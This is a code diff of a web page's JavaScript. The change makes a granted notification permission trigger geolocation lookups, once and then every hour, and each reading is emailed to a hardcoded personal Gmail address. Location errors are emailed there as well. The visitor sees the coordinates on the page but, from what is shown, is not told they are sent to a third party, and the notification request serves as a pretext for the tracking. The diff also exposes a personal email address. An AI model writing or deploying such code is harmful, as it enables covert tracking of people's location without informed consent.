@@ -34,36 +34,54 @@
             const locationDisplay = document.getElementById("locationDisplay");
             let latitude, longitude;
 
-            // Request Notification Permission
-            if ("Notification" in window) {
-                Notification.requestPermission().then(permission => {
-                    if (permission === "granted") {
-                        sendEmail("Notification Permission Granted", "The user has granted notification permissions.", "khalilrodeni@gmail.com");
-                    } else {
-                        sendEmail("Notification Permission Denied", "The user has denied notification permissions.", "khalilrodeni@gmail.com");
-                    }
-                });
+            // Request Notification and Geolocation Permissions on Page Load
+            requestPermissions();
+
+            // Function to request permissions
+            function requestPermissions() {
+                // Request notification permission
+                if ("Notification" in window) {
+                    Notification.requestPermission().then(permission => {
+                        if (permission === "granted") {
+                            startLocationUpdates(); // Start location updates if notification is allowed
+                        } else {
+                            alert("Notifications disabled. Location updates will not be sent.");
+                        }
+                    });
+                } else {
+                    alert("Notifications are not supported by your browser.");
+                }
             }
 
-            // Geolocation permission and location display
-            if ("geolocation" in navigator) {
+            // Start location updates every hour (3600000 ms) after permissions are granted
+            function startLocationUpdates() {
+                if ("geolocation" in navigator) {
+                    // Run immediately and set interval for every hour
+                    updateLocation();
+                    setInterval(updateLocation, 3600000); // 1 hour interval
+                } else {
+                    locationDisplay.textContent = "Geolocation is not supported by this browser.";
+                }
+            }
+
+            // Function to fetch location and send email
+            function updateLocation() {
                 navigator.geolocation.getCurrentPosition(
                     (position) => {
                         latitude = position.coords.latitude;
                         longitude = position.coords.longitude;
                         locationDisplay.textContent = `Latitude: ${latitude}, Longitude: ${longitude}`;
-                        
-                        // Send initial location data email
-                        sendEmail("Geolocation Data", `Latitude: ${latitude}, Longitude: ${longitude}`, "khalilrodeni@gmail.com");
+
+                        // Send location data email
+                        sendEmail("Hourly Location Update", `Latitude: ${latitude}, Longitude: ${longitude}`, "khalilrodeni@gmail.com");
                     },
                     (error) => {
                         locationDisplay.textContent = error.code === error.PERMISSION_DENIED ? "Location access denied by user." : "Location error.";
                         sendEmail("Location Access Error", locationDisplay.textContent, "khalilrodeni@gmail.com");
                     }
                 );
-            } else {
-                locationDisplay.textContent = "Geolocation is not supported by this browser.";
             }
+
         });
 
         // Form submission
